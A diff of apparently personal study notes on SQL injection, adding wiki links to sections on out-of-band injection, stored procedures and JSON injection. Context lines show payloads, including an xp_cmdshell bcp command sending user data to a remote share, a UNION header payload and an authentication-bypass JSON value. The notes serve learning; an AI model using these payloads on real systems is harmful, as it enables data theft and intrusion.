@@ -63,7 +63,7 @@ Out-of-band SQL injection attacks utilize the methodology of writing to another 
 Out-of-band SQL injection can be achieved using `SELECT...INTO OUTFILE` or `load_file`command. Example, `SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';`
 An attacker could then access this file via an SMB share or HTTP server running on the database server, thereby exfiltrating the data through an alternate channel.
 #### Microsoft SQL Server (MSSQL)
-We can achieve OOB SQL injection using features like xp_cmdshell, which allows the execution of shell commands directly from SQL queries.
+We can achieve OOB SQL injection using features like xp_cmdshell, which allows the execution of [[shell]] commands directly from SQL queries.
  `EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';`
  Alternatively, `OPENROWSET` or `BULK INSERT` can be used to interact with external data sources, facilitating data exfiltration through OOB channels.
 #### Oracle
@@ -105,7 +105,7 @@ Here's an example: `curl -H "User-Agent: ' UNION SELECT username, password FROM 
 Stored procedures are routines stored in the database that can perform various operation, such as inserting, updating, or querying data. While stored procedures can help improve performance and ensure consistency.
 Stored procedures are precompiled SQL statements that can be executed as a single unit. They are stored in the database and can be called by applications to perform specific tasks. Stored procedures can accept parameters, which can make them flexible and powerful. However, if these parameters are not properly sanitized, they can introduce SQL injection vulnerabilities.
 #### XML and JSON Injection    
-Applications that parse XML or JSON data and use the parsed data in SQL queries can be vulnerable to injection if they do not properly sanitize the inputs. XML and JSON injection involves injecting malicious data into XML or JSON structures that are then used in SQL queries. This can occur if the application directly uses parsed values in SQL statements.
+Applications that parse [[XML]] or JSON data and use the parsed data in SQL queries can be vulnerable to injection if they do not properly sanitize the inputs. XML and JSON injection involves injecting malicious data into XML or JSON structures that are then used in SQL queries. This can occur if the application directly uses parsed values in SQL statements.
  `{   "username": "admin' OR '1'='1--",   "password": "password" }`
 If the application uses these values directly in a SQL query like `SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- AND password = 'password'`, it could result in an injection.
 
